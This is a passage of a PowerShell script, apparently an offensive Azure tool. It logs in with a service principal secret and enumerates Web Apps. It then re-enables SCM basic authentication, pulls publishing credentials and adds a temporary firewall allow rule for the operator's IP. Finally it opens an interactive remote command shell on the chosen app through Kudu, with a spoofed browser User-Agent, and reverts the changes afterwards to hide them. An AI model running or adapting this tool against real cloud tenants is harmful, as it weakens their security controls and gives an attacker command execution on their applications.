        try { Invoke-WebAppCommand -App $app -Command $Command }
        catch { [pscustomobject]@{ AppName=$app.Name; ExitCode=-1; Output=""; Error=$_.Exception.Message } }
    }
}

function Select-WebApp {
    if (-not $global:WebApps -or $global:WebApps.Count -eq 0) { throw "No WebApps in memory." }
    $global:WebApps | Out-GridView -Title "Select Web App" -PassThru
}

function Start-WebAppShell {
    param(
        [pscustomobject]$App,
        [string]$AzureARMToken,
        [string]$MyIpCidr,
        [int]$TempAllowMinutes = 30
    )

    while ($true) {
        if (-not $App) {
            if (-not $global:WebApps -or $global:WebApps.Count -eq 0) { Write-Host "No WebApps in memory. Run Get-WebApp first." -ForegroundColor Yellow; return }
            $App = Select-WebApp
            if (-not $App) { Write-Host "Selection cancelled." -ForegroundColor Yellow; return }
        }

        
        $script:CurrentApp = $App

        
        $polHeaders = @{ 
            "Authorization" = "Bearer $AzureARMToken"
            "Accept" = "application/json" 
            "User-Agent" = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
        }
        $base = "https://management.azure.com/subscriptions/$($App.SubscriptionId)/resourceGroups/$($App.ResourceGroup)/providers/Microsoft.Web/sites/$($App.Name)"
        $prevScm = $true; $scmChanged = $false
        try {
            $pol = Invoke-RestMethod "$base/basicPublishingCredentialsPolicies?api-version=2024-11-01" -Headers $polHeaders -ErrorAction Stop
            $prevScm = ($pol.value | Where-Object name -eq 'scm').properties.allow
        } catch { Write-Warning "[!] Cannot read SCM policy. Continuing best-effort." }

        if (-not $prevScm) {
            if (Test-CanToggleScmBasicAuth -SubscriptionId $App.SubscriptionId -ResourceGroupName $App.ResourceGroup -SiteName $App.Name -AzureAccessToken $AzureARMToken) {
                ChnageSCM -AzureARMToken $AzureARMToken -SubscriptionId $App.SubscriptionId -ResourceGroup $App.ResourceGroup -WPName $App.Name -Add
                $scmChanged = $true
            } else {
                Write-Host "[-] Not allowed to enable SCM (RBAC/Policy deny). Shell cannot proceed." -ForegroundColor DarkYellow
                $App = $null; continue
            }
        }

       
        if (-not (Ensure-AppCreds -App $App)) {
            Write-Host "App '$($App.Name)': cannot obtain publishing creds." -ForegroundColor Red
            if ($scmChanged) { ChnageSCM -AzureARMToken $AzureARMToken -SubscriptionId $App.SubscriptionId -ResourceGroup $App.ResourceGroup -WPName $App.Name -Delete }
            $App = $null; continue
        }

       
        $addedRuleName = $null
        $needTempIp = $false
        try { [void](Invoke-WebAppCommand -App $App -Command 'whoami') }
        catch {
            if ($_.Exception.Message -like '*403 Ip Forbidden*') { $needTempIp = $true } else { throw }
        }

        if ($needTempIp) {
            if (-not $MyIpCidr) { $MyIpCidr = (Get-MyPublicIp -CIDR) }
            if (-not $MyIpCidr) {
                Write-Host "Cannot determine public IP. Provide -MyIpCidr ( X.X.X.X/32)" -ForegroundColor Red
                if ($scmChanged) { ChnageSCM -AzureARMToken $AzureARMToken -SubscriptionId $App.SubscriptionId -ResourceGroup $App.ResourceGroup -WPName $App.Name -Delete }
                return
            }
            Write-Host "[*] Adding temporary SCM IP allow: $MyIpCidr" -ForegroundColor Yellow
            try {
                
                $slot = Get-AppSlotFromScmHost -App $App
                $ruleName,$target,$useMain = Add-TempScmIpAllow -Sub $App.SubscriptionId -Rg $App.ResourceGroup -Site $App.Name -Bearer $AzureARMToken -MyIpCidr $MyIpCidr -Minutes $TempAllowMinutes -Slot $slot
                $addedRuleName = $ruleName
            } catch {
                Write-Host "[-] Failed adding temporary SCM IP allow: $($_.Exception.Message)" -ForegroundColor Red
                if ($scmChanged) { ChnageSCM -AzureARMToken $AzureARMToken -SubscriptionId $App.SubscriptionId -ResourceGroup $App.ResourceGroup -WPName $App.Name -Delete }
                return
            }
            Start-Sleep -Seconds 3
            [void](Invoke-WebAppCommand -App $App -Command 'whoami')
        }

        try {
            Write-Host "Starting shell on $($App.Name) ($($App.Platform)). Type 'exit' to switch app, 'quit' to quit." -ForegroundColor Green
            while ($true) {
                $cmd = Read-Host "$($App.Name)>"
                if ($cmd -eq 'quit') { return }
                if ($cmd -eq 'exit') { $App = $null; break }
                if ([string]::IsNullOrWhiteSpace($cmd)) { continue }
                try {
                    $r = Invoke-WebAppCommand -App $App -Command $cmd
                    if ($r.Output) { $r.Output.TrimEnd("`r","`n") | Write-Host -ForegroundColor White }
                    if ($r.Error)  { $r.Error.TrimEnd("`r","`n")  | Write-Host -ForegroundColor Red }
                } catch { Write-Host $_.Exception.Message -ForegroundColor Red }
            }
        }
        finally {
            if ($addedRuleName) {
                Write-Host "[*] Removing temporary SCM IP allow..." -ForegroundColor Yellow
                Remove-TempScmIpAllow -Sub $App.SubscriptionId -Rg $App.ResourceGroup -Site $App.Name -Bearer $AzureARMToken -RuleName $addedRuleName
            }
            if ($scmChanged) {
                ChnageSCM -AzureARMToken $AzureARMToken -SubscriptionId $App.SubscriptionId -ResourceGroup $App.ResourceGroup -WPName $App.Name -Delete
            }
            $script:CurrentApp = $null
        }
    }
}



function main {
    
    $creds = Show-ClientLoginGui -Topmost
    if (-not $creds) { Write-Host "Canceled." -ForegroundColor Yellow; return }
    $script:ClientId     = $creds.ClientId
    $script:ClientSecret = $creds.ClientSecret
    $DomainName          = $creds.Domain

    $script:TenantId = GetTenantID -TenantName $DomainName
    if (-not $script:TenantId) { Write-Host "Could not resolve Tenant ID." -ForegroundColor Red; return }

    $ARM = GetAzureARMToken -ClientID $script:ClientId -ClientSecret $script:ClientSecret -TenantID $script:TenantId
    if (-not $ARM -or ($ARM -is [System.Management.Automation.ErrorRecord])) { Write-Host "Failed to get ARM token." -ForegroundColor Red; return }
    $script:ArmToken = $ARM

    
    $subs = GetSubscriptions -AzureARMToken $ARM
    #$subs = @(
    #   [PSCustomObject]@{ DisplayName="aaaa"; SubscriptionId="aaaa" }
    #)

    Get-WebApp -AzureARMToken $ARM -Subscriptions $subs -ClientID $script:ClientId -ClientSecret $script:ClientSecret -TenantID $script:TenantId

    if (-not $global:WebApps -or $global:WebApps.Count -eq 0) { Write-Host "No WebApps found." -ForegroundColor Yellow; return }

    while ($true) {
        try { $app = Select-WebApp } catch { break }
        if (-not $app) { break }

 
        $null = Start-WebAppShell -App $app -AzureARMToken $ARM -MyIpCidr $null -TempAllowMinutes 30

        $cap = Test-KuduCapabilities -App $app
        if (-not $cap.HasCommandApi) {
            Write-Host "Opening Kudu Debug Console for '$($app.Name)'..." -ForegroundColor Yellow
            Open-WebAppDebugConsole -App $app
        }
    }
}

main

} 
